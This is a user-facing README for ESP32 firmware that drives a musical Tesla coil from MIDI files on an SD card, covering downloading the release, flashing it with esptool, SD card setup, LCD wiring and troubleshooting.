# ⚡ OneTesla-SD-Interrupter-ESP32 - Easy Control for Tesla Coil Music

[![Download Release](https://img.shields.io/badge/Download-OneTesla-SD--Interrupter--ESP32-blue?style=for-the-badge)](https://github.com/abeasley175/OneTesla-SD-Interrupter-ESP32/releases)

---

## 📖 What is OneTesla-SD-Interrupter-ESP32?

OneTesla-SD-Interrupter-ESP32 is a ready-to-use software that lets you control a musical Tesla coil using an ESP32 microcontroller. It uses an SD card and an I2C LCD screen to play music through your Tesla coil. It supports Arduino SD libraries and UART MIDI, making it flexible to use with different devices.

You don’t need to know how to program. This guide will walk you through how to get the software on your ESP32 device and start making music with your Tesla coil.

---

## ⚙️ What You Will Need

Before you start, make sure you have the following:

- **ESP32 microcontroller board**: This is the main controller for your Tesla coil setup.
- **Tesla coil with a musical interrupter setup**: The device that produces musical sparks.
- **MicroSD card**: To store music files for playback.
- **I2C LCD display**: Optional, to show status and menu options.
- **USB cable**: To connect the ESP32 to your computer.
- **Computer with internet access**: To download the software and transfer files.

---

## 🚀 Getting Started

1. **Download the Software**

   Click the big blue button at the top or visit the releases page here:

   [Download OneTesla-SD-Interrupter-ESP32](https://github.com/abeasley175/OneTesla-SD-Interrupter-ESP32/releases)

   This page contains the latest compiled files you will need.

2. **Select the Right Version**

   Look for the latest stable release. It usually has a name like `OneTesla-SD-Interrupter-ESP32-vX.X.zip` or `bin` files ready to flash.

3. **Save Files to Your Computer**

   Download the release files and save them in a folder where you can easily find them.

---

## 💻 How to Install on Your ESP32

### Using ESP32 Flash Tool

If you have never installed software on an ESP32 before, the easiest way is to use a flashing tool like **ESP32 Flash Download Tool** or **esptool**.

#### Steps:

1. **Connect the ESP32 board to your computer using the USB cable.**

2. **Open the flash tool on your computer.** If you do not have one, here are two popular options:

   - [ESP32 Flash Download Tool (Windows)](https://www.espressif.com/en/support/download/other-tools)
   - [esptool (cross-platform)](https://github.com/espressif/esptool)

3. **Select the firmware file** from the downloaded release package. This will be a `.bin` file.

4. **Choose the correct COM port** or serial port for your ESP32 board.

5. **Start the flashing process.** Wait until the flash completes.

6. **Disconnect the ESP32 and restart it.**

If you want a step-by-step guide for flashing, check the documentation on your ESP32 board’s website or the flash tool’s instructions.

---

## 🛠 What This Software Does

- **Plays music via Tesla coil:** Uses stored music files on the SD card.
- **Interacts with I2C LCD:** Shows menus and status updates on a small screen.
- **Supports UART MIDI input:** Allows sending MIDI commands for live control.
- **Uses Arduino libraries:** Works smoothly with standard Arduino code and tools.
- **Simple SD card interface:** Load new music by copying files to the SD card.

---

## 📂 Preparing Your SD Card

You will need a microSD card formatted as FAT32 or exFAT.

1. **Insert the SD card into your computer.**

2. **Format it** if it’s not already FAT32 or exFAT.

3. **Add music files:**

   - The software supports MIDI files (`.mid`) for playback.
   - Copy the MIDI files into the root folder or the folder specified in the ReadMe inside the release.

4. **Safely eject the SD card** from your computer.

5. **Insert it into the ESP32 SD card slot.**

---

## 🔌 Connecting the Hardware

1. **Plug the microSD card into your ESP32 board.**

2. **Connect the I2C LCD screen** to the board using SDA and SCL pins.

3. **Connect your Tesla coil interrupter circuitry** as described in your Tesla coil project guide.

4. **Use the USB cable** to power the ESP32 from your computer or a USB charger.

---

## 🎵 Using the Software

- When you start the ESP32, the LCD screen will display the current status.
- The software will read MIDI files from the SD card and play them through the Tesla coil.
- Use the buttons connected to the ESP32 (if any) or UART MIDI input to control playback.
- The LCD screen provides feedback on what the device is doing.

---

## 🧰 Troubleshooting Tips

- If the device does not start, check your USB connection and power source.
- Make sure the SD card is inserted correctly and formatted properly.
- Verify that your MIDI files are compatible and placed in the correct folder.
- Check wiring of the I2C LCD screen for proper SDA and SCL connections.
- Reset the ESP32 by pressing the reset button on your board.
- Follow forums for Tesla coil communities if you experience hardware-specific issues.

---

## 📥 Download & Install

To get the software:

1. Visit the release page:  
   [https://github.com/abeasley175/OneTesla-SD-Interrupter-ESP32/releases](https://github.com/abeasley175/OneTesla-SD-Interrupter-ESP32/releases)

2. Download the latest release files for your ESP32.

3. Use the flashing tool of your choice to upload the firmware to your ESP32.

4. Prepare the SD card with MIDI files and insert it into your ESP32.

5. Power on the device and enjoy your musical Tesla coil.

---

## 🔗 Useful Links

- [ESP32 Official Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/)
- [Arduino SD Library](https://www.arduino.cc/en/Reference/SD)
- [MIDI Specification](https://www.midi.org/specifications-old/item/table-1-summary-of-midi-message)

---

## 🧑‍💻 About This Project

This project combines Arduino code and ESP32 capabilities to give Tesla coil enthusiasts an easy way to play music through their coils. It supports standard music files and allows live MIDI control, with status updates on an easy-to-read LCD.

Topics covered include:

- Arduino programming
- DR SSTC (Dual Resonant Solid State Tesla Coil) control
- SD card file handling
- UART communication
- I2C LCD interface

---

For questions or help, please open an issue on the GitHub repository.